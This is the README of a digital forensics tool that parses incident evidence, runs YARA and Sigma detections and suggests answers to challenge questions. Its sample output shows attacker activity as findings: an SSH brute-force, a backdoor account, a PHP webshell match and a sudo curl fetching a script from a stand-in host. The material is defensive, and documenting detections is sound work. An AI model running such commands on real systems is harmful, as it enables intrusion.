# inspecthor

```
██╗███╗   ██╗███████╗██████╗ ███████╗ ██████╗████████╗██╗  ██╗ ██████╗ ██████╗
██║████╗  ██║██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗
██║██╔██╗ ██║███████╗██████╔╝█████╗  ██║        ██║   ███████║██║   ██║██████╔╝
██║██║╚██╗██║╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══██║██║   ██║██╔══██╗
██║██║ ╚████║███████║██║     ███████╗╚██████╗   ██║   ██║  ██║╚██████╔╝██║  ██║
╚═╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
```

[![tests](https://github.com/Cobrastrike62/Inspecthor/actions/workflows/tests.yml/badge.svg)](https://github.com/Cobrastrike62/Inspecthor/actions/workflows/tests.yml)

Point it at forensic evidence. It tells you what happened.

> Only use this on evidence you are authorized to examine. Sherlock packages and
> real incident artifacts can contain live malware — work in a VM.

## Run it

```bash
inspecthor sherlock.zip
```

That's the tool. One command, no flags. It unpacks the archive, works out which
parser each file needs, reads them all, figures out the host's timezone and the
year on its own, runs YARA and Sigma, pulls out the indicators, finds the question
file the package shipped with, and answers it.

```
4 artifact(s) parsed, 10 events, 2 detection(s)
indicators: domain=2  ipv4=1  url=1

What the evidence says about itself
timezone  UTC                                       default (no timezone evidence found)
host      web01                                     most common host field in parsed events
year      2024                                      latest event in artifacts with absolute timestamps
activity  2024-03-01 09:10 to 2024-03-01 09:22 UTC  from artifacts with absolute timestamps

What stands out
 !!  2024-03-01 09:15:14  web01  admin     ssh_login_success  Brute-force SUCCESS: admin from 45.33.32.156 after 3 failures
 !!  2024-03-01 09:17:00  web01  backdoor  account_created    Local account created: backdoor
 !!  2024-03-01 09:20:11  web01            yara_match         YARA Inspecthor_Webshell_PHP matched shell.php
 !   2024-03-01 09:16:00  web01  admin     sudo_command       sudo: admin ran /usr/bin/curl http://evil.example.net/x.sh

The evidence came with 4 question(s)  (candidates — verify before submitting)

  What is the attacker's IP address?
    > 0.80  45.33.32.156   Attacker source IP — ssh_failed_login @ 2024-03-01 09:15:01 (4 occurrences)

  What account did the attacker create?
    > 0.85  backdoor   Account created by attacker — account_created @ 2024-03-01 09:17:00

Saved
  report   pkg-report.md
  timeline pkg-timeline.csv
  case     pkg.db
```

Every suggestion shows the event it came from. Nothing is submitted for you, and
nothing claims to be certain — `>` means it is confident, `·` means look closer.

## What it writes, and where

Three files, named after the evidence, in your current directory:

```
sherlock.zip   ->   sherlock.db            the case (everything it parsed)
                    sherlock-report.md     the writeup
                    sherlock-timeline.csv  every event, for a spreadsheet
```

The name comes from the evidence path — a file's stem or a folder's name,
lowercased. `--out DIR` puts them elsewhere, `--name "Brutus"` names them
yourself.

**It will not overwrite or merge someone else's case.** Two rules:

- Analyze the **same evidence** again and it replaces that case, rather than
  adding a second copy of every event to it. It says
  `replacing the previous analysis in sherlock.db`. The case file holds nothing
  but derived data, so re-deriving it is always safe.
- Analyze **different evidence** that happens to produce the same name — two
  Sherlocks both unpacking to a folder called `evidence`, which is common — and
  the existing case is left alone. You get `evidence-2.db` and it tells you:
  `evidence.db already holds a different case; using evidence-2.db`.

A file it does not recognize as one of its own cases is never touched.

## Then follow up

Three more commands, all working against the case you just analyzed:

```bash
inspecthor ask "when did they first log in?"     # answer one question
inspecthor find 45.33.32.156                     # search every artifact at once
inspecthor timeline                              # what happened, in order
```

`timeline --all` gives you everything instead of just the notable events. `find`
takes `--regex`. That is the whole interface.

## Install

```bash
git clone https://github.com/Cobrastrike62/Inspecthor && cd Inspecthor
./install.sh --full --link
```

`--full` adds every optional parser, `--link` puts the command on your PATH. On a
corporate network that intercepts TLS, add `--trusted-host`.

Without `--full` you get a stdlib-only install that still handles text, syslog,
JSON and SQLite evidence — the whole pipeline works, just fewer formats. When it
meets a file it cannot read, it says which install unlocks it:

```
! would parse with evtx — pip install 'inspecthor[evtx]'
```

Run `inspecthor` with no arguments to see what is available.

### Updating

```bash
cd inspecthor && git pull
```

The install is editable, so the command picks up new code immediately. Re-run
`./install.sh --full` as well when a release adds a dependency — it reuses the
existing venv, so it is cheap to run either way.

## What it reads

| Evidence | Needs |
|---|---|
| Linux `auth.log`, `secure`, `syslog` — including rotated and gzipped | nothing |
| Timestamped app logs, Apache/nginx access logs, plain text | nothing |
| Windows Event Logs — Security, System, PowerShell, Sysmon, Task, RDP, Defender | `--full` |
| Registry hives — Run keys, services, timezone, USB, UserAssist, amcache | `--full` |
| **KAPE collections** and disk images — VHDX, VHD, E01, VMDK, QCOW2 | `--full` |

Not yet: `$MFT`/`$J`, prefetch, LNK, SRUM, browser history, PCAP, memory, cloud
logs. Those are the next parsers.

### KAPE collections

Point it at the VHDX KAPE wrote — no mounting, no extracting first:

```bash
inspecthor 2026-07-27T191212_HOSTNAME.vhdx
```

It opens the container, finds the NTFS volume, and pulls out **only the files it
can parse**, because a collection is mostly formats there is no parser for yet and
copying all of it out would waste gigabytes. It tells you what it left behind:

```
vhdx image: pulled 258 parseable file(s) (917 MB); left behind 516 .pf, 477 .lnk,
43 .automaticdestinations-ms — no parser for those yet
```

That is also where the timezone comes from: a KAPE collection includes the
registry, so the host's real UTC offset and computer name are read out of it
instead of guessed.

## Why it can skip the flags

Classic syslog lines look like this:

```
Mar  1 09:15:01 web01 sshd[1010]: Failed password for admin from 45.33.32.156
```

No year. No UTC offset. Most tools make you supply both, and if you get them
wrong your Linux timeline silently sits in the wrong year next to your Windows
events.

inspecthor reads the rest of the evidence first. Event logs carry absolute UTC
timestamps, so they pin down the year. The registry records `TimeZoneInformation`
and `ComputerName`. It parses everything that dates itself, derives the context
from that, and only then reads the ambiguous files — which is why the normal case
needs no flags at all.

It always shows you what it worked out and where each value came from. If it is
wrong, override it:

```bash
inspecthor evidence/ --tz America/Chicago --year 2024 --host WS01
```

Other flags: `--out DIR` to put the outputs somewhere else, `--no-detect` to skip
YARA and Sigma, `--rules DIR` to add your own rules. `inspecthor analyze --help`
lists them.

## Adding your own detections

Drop a `.yar` or Sigma `.yml` into a directory and pass `--rules DIR`. No code.

One catch worth knowing: YARA's regex engine has no non-capturing groups. Write
`(a|b)`, never `(?:a|b)`, or the rule will not compile.

## Adding a parser

One file in `inspecthor/parsers/plugins/`. Nothing else to touch — the registry
finds it:

```python
@register
class PrefetchParser(Parser):
    name, display, category = "prefetch", "Windows Prefetch", "windows"
    magic = (b"MAM\x04",)
    path_globs = ("*.pf",)

    def parse(self, path, ctx):
        for name, run_time, count in _read(path):
            yield ctx.event(timestamp=run_time, timestamp_desc="Last Run",
                            event_type="process_exec", attck=["T1204"],
                            message=f"{name} executed (run #{count})")
```

[DESIGN.md](DESIGN.md) has the details — the parser contract, the event schema,
and why the pieces are shaped the way they are.

## Tests

```bash
pytest -q
```

Fully offline; every fixture is generated. Passes on a stdlib-only install, with
the format-specific tests skipping themselves.

## License and attribution

inspecthor is MIT licensed — see [LICENSE](LICENSE).

It bundles a slimmed-down copy of the **MITRE ATT&CK®** Enterprise matrix
(v19.1) so technique names resolve offline, derived from
[mitre-attack/attack-stix-data](https://github.com/mitre-attack/attack-stix-data).

> ATT&CK® is a registered trademark of The MITRE Corporation.
> © 2026 The MITRE Corporation. This work is reproduced and distributed with the
> permission of The MITRE Corporation. MITRE does not endorse or sponsor this
> project.

Optional extras install third-party packages under their own licenses, several of
them copyleft — see [NOTICE](NOTICE) before redistributing a bundle that includes
them.
